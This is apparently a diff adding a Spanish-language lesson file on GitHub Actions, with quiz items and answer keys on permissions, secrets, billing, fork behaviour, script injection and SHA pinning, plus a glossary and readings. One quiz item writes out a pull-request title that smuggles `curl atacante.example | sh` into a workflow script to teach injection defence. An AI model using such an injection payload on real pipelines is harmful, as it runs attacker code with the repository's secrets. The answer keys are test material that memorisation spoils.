+    "Sí, pero solo si «B» corre después de «A»; el orden de ejecución decide si el archivo existe cuando «B» lo busca",
+    "No, salvo que los dos jobs usen la misma etiqueta `runs-on`, porque entonces GitHub les asigna la misma máquina"
+   ],
+   "c": 0,
+   "e": "Cada job tiene su máquina virtual propia, que se destruye al terminar, así que no hay carpeta compartida entre jobs: hace falta un artefacto. Compartir la carpeta por ser del mismo workflow es el error de confundir workflow con máquina. Que corran uno después del otro no cambia nada, porque son máquinas distintas. Y la etiqueta de `runs-on` elige un tipo de máquina, no una máquina concreta."
+  },
+  {
+   "p": "Un workflow tiene `permissions:\\n  contents: write` a nivel del workflow y nada más. Un paso intenta comentar en un issue con el GITHUB_TOKEN. ¿Qué pasa y por qué?",
+   "o": [
+    "Funciona: `contents: write` es el permiso más alto y alcanza para todo recurso del repositorio, incluidos los issues",
+    "Funciona, porque el GITHUB_TOKEN de cada corrida siempre puede comentar y `permissions` solo limita el acceso al código",
+    "Falla por permisos: al nombrar un permiso, todos los que no se nombraron pasan a `none`, así que el token no puede escribir en issues",
+    "Falla, porque comentar exige un secreto de Actions guardado a mano y el GITHUB_TOKEN no puede hacerlo bajo ninguna configuración"
+   ],
+   "c": 2,
+   "e": "Según la documentación de la sintaxis de workflows, al definir cualquier permiso los no definidos quedan en `none`: el token pierde el acceso a issues. No existe un permiso «máximo» que cubra todo. Es falso que `permissions` solo toque el código, y también que el GITHUB_TOKEN no pueda comentar: puede, si se le da `issues: write`."
+  },
+  {
+   "p": "Un colaborador de tu repositorio privado tiene permiso de escritura. Tu clave de API está guardada como secreto de Actions. ¿Cuál afirmación es correcta?",
+   "o": [
+    "No puede: los secretos están cifrados y la interfaz nunca los muestra, así que ninguna persona puede obtener su valor",
+    "Puede leerla escribiendo un workflow que la use, porque el permiso de escritura da acceso a todos los secretos del repositorio",
+    "No puede, porque el enmascarado de los registros reemplaza el valor por asteriscos en cualquier salida que el workflow produzca",
+    "Puede leerla solo si es administrador del repositorio; con escritura únicamente puede ejecutar workflows, no modificarlos"
+   ],
+   "c": 1,
+   "e": "Quien puede editar workflows puede hacer que un paso use el secreto y lo envíe a otro lado; el enmascarado solo evita el accidente en pantalla. Que la interfaz no lo muestre no impide que un workflow lo lea. Y no hace falta ser administrador: con escritura alcanza, por eso se recomienda dar credenciales de poco poder."
+  },
+  {
+   "p": "Un workflow con cinco jobs tarda 17 minutos de reloj y suma 18 minutos de máquinas encendidas. Querés bajar la factura, no la espera. ¿Qué cambio sirve?",
+   "o": [
+    "Dejar la espera como está pero poner más jobs en paralelo, porque más paralelismo siempre baja los minutos facturados",
+    "Quitar los `needs` entre jobs, ya que sin dependencias los minutos de máquina se descuentan de a pares",
+    "Cambiar `ubuntu-latest` por `ubuntu-24.04`, que se factura aparte y no consume el cómputo incluido en el plan",
+    "Acortar los jobs o evitar corridas inútiles, por ejemplo cancelando las corridas viejas con `concurrency`"
+   ],
+   "c": 3,
+   "e": "La factura es la suma de los minutos de cada máquina, sin importar si corren a la vez; solo se baja con jobs más cortos o menos corridas. Paralelizar acorta la espera pero cada job se sigue pagando. Quitar `needs` no descuenta nada y puede romper el orden. Y `ubuntu-latest` y `ubuntu-24.04` son etiquetas de runners de la misma familia, con la misma tarifa."
+  },
+  {
+   "p": "Un workflow hace `run: ./desplegar.sh \"${{ github.event.pull_request.title }}\"`. Alguien abre un pull request con título `x\"; curl atacante.example | sh; \"`. ¿Qué hace el motor?",
+   "o": [
+    "Pasa el título como argumento seguro, porque las comillas dobles del script impiden que el shell interprete su contenido",
+    "Rechaza la corrida porque el título contiene caracteres que no son válidos en una expresión de GitHub Actions",
+    "Pega el título dentro del texto del script antes de ejecutarlo, y el shell ve tres comandos en lugar de uno",
+    "Ejecuta el script con el título como dato, y el `curl` solo se vería como texto en el registro de la corrida"
+   ],
+   "c": 2,
+   "e": "La expresión `${{ }}` se reemplaza por su valor antes de que corra el shell, y el título trae sus propias comillas que cierran las del script. Las comillas del autor del workflow no protegen contra comillas dentro del dato. GitHub no valida el contenido del título, y el `curl` no sería texto: se ejecutaría. El arreglo es pasar el valor por `env:`."
+  },
+  {
+   "p": "En un repositorio público, un workflow se dispara con `pull_request` desde un fork de otra persona y usa `${{ secrets.CLAVE }}`. ¿Qué valor tiene `secrets.CLAVE` en esa corrida?",
+   "o": [
+    "El valor real, porque la corrida pertenece al repositorio donde está guardado el secreto y no al fork",
+    "Vacío: los secretos no se entregan a corridas disparadas desde un fork, salvo el GITHUB_TOKEN",
+    "Un valor enmascarado con asteriscos que sirve igual para autenticarse contra el servicio de destino",
+    "El valor real, pero solo si quien abre el pull request ya fue colaborador del repositorio en el pasado"
+   ],
+   "c": 1,
+   "e": "La documentación dice que, salvo el GITHUB_TOKEN, los secretos no llegan a los workflows disparados desde un fork: si llegaran, cualquiera filtraría tus claves con un pull request. Los asteriscos son solo el enmascarado del log y el valor no se entrega enmascarado. Y el historial de colaboración no cambia la regla."
+  },
+  {
+   "p": "Alguien propone fijar `actions/checkout@v4` por su SHA de 40 caracteres. ¿Qué riesgo concreto reduce?",
+   "o": [
+    "Que la acción se vuelva más lenta con el tiempo, porque las etiquetas móviles se resuelven con una consulta extra en cada corrida",
+    "Que GitHub deje de ofrecer la acción cuando salga una versión mayor, algo que el SHA impide al congelar la versión",
+    "Que el código de la acción lo pueda leer cualquiera, porque un SHA lo mantiene privado dentro de tu repositorio",
+    "Que quien mantiene la acción mueva la etiqueta `v4` a un commit con código nuevo y tu próxima corrida lo ejecute con tus secretos a la vista"
+   ],
+   "c": 3,
+   "e": "Una etiqueta se puede mover y un SHA de commit no sin cambiar su contenido: fijarlo evita recibir código distinto sin enterarte, en un paso que corre con los permisos y el entorno del job. No mejora la velocidad, no evita retiros de versiones y no vuelve privado el código de la acción."
+  }
+ ],
+ "feynman": "Explicale a alguien de logística, sin jerga, qué pasa entre que apretás un botón y aparece un archivo listo en una web: quién hace el trabajo, dónde, con qué llaves, y cómo evitarías que un extraño usara esas llaves. Usá una analogía propia, distinta de la del depósito.",
+ "para_profundizar": [
+  {
+   "fuente": "ci-gha-workflows-concepts",
+   "nota": "La definición oficial de workflow, evento, job y runner. Leé las primeras secciones para ver el vocabulario tal como lo usa GitHub, que es el que vas a encontrar en cualquier conversación técnica."
+  },
+  {
+   "fuente": "ci-gha-secure-use",
+   "nota": "La guía de uso seguro: inyección en scripts, permisos del token, fijar acciones por SHA y riesgos de los secretos. Es la lectura que más se parece al trabajo real de revisar un workflow."
+  },
+  {
+   "fuente": "ci-actionlint-readme",
+   "nota": "El README de actionlint con la lista de comprobaciones. Sirve para ver qué errores detecta una máquina sin ejecutar nada y cuáles tendrás que ver vos."
+  },
+  {
+   "fuente": "ci-gha-billing",
+   "nota": "La página de facturación con el cómputo incluido por plan y las tarifas por tipo de runner, para calcular el costo de tus propias corridas."
+  }
+ ],
+ "videos": [
+  {
+   "q": "GitHub Actions explained workflow job step runner",
+   "por_que": "Para ver una corrida real en la interfaz de Actions, con sus jobs en paralelo y sus pasos desplegados, y comparar con el grafo de hoy."
+  }
+ ],
+ "terminos": [
+  {
+   "t": "workflow de Actions",
+   "d": "Un archivo YAML en la carpeta .github/workflows del repositorio que dice cuándo arrancar (qué eventos lo disparan) y qué trabajos ejecutar. Cada ejecución del archivo se llama corrida."
+  },
+  {
+   "t": "job",
+   "d": "Un grupo de pasos que corre entero en una misma máquina virtual. Dos jobs del mismo workflow corren en máquinas distintas y comparten datos solo mediante artefactos."
+  },
+  {
+   "t": "runner alojado",
+   "d": "La máquina virtual que GitHub crea para correr un job, con el sistema operativo pedido y herramientas habituales ya instaladas. Se destruye al terminar el job."
+  },
+  {
+   "t": "secreto de Actions",
+   "d": "Un valor confidencial (clave de API, token, contraseña) que se guarda cifrado en la configuración del repositorio y que un workflow lee con la expresión secrets. No se entrega a corridas disparadas desde forks."
+  },
+  {
+   "t": "GITHUB_TOKEN",
+   "d": "Una credencial que GitHub genera sola al empezar cada corrida y que vence al terminar. Sus permisos sobre el repositorio se fijan con la clave permissions del workflow."
+  },
+  {
+   "t": "acción de Actions",
+   "d": "Un paquete reutilizable que un paso invoca con uses. Lo escribe GitHub u otra persona, y corre con los permisos y el entorno del job que lo llama."
+  }
+ ],
+ "siguiente": "Estrategias de despliegue: cómo reemplazar la versión vieja por la nueva sin que nadie lo note, y cómo volver atrás si sale mal."
+}
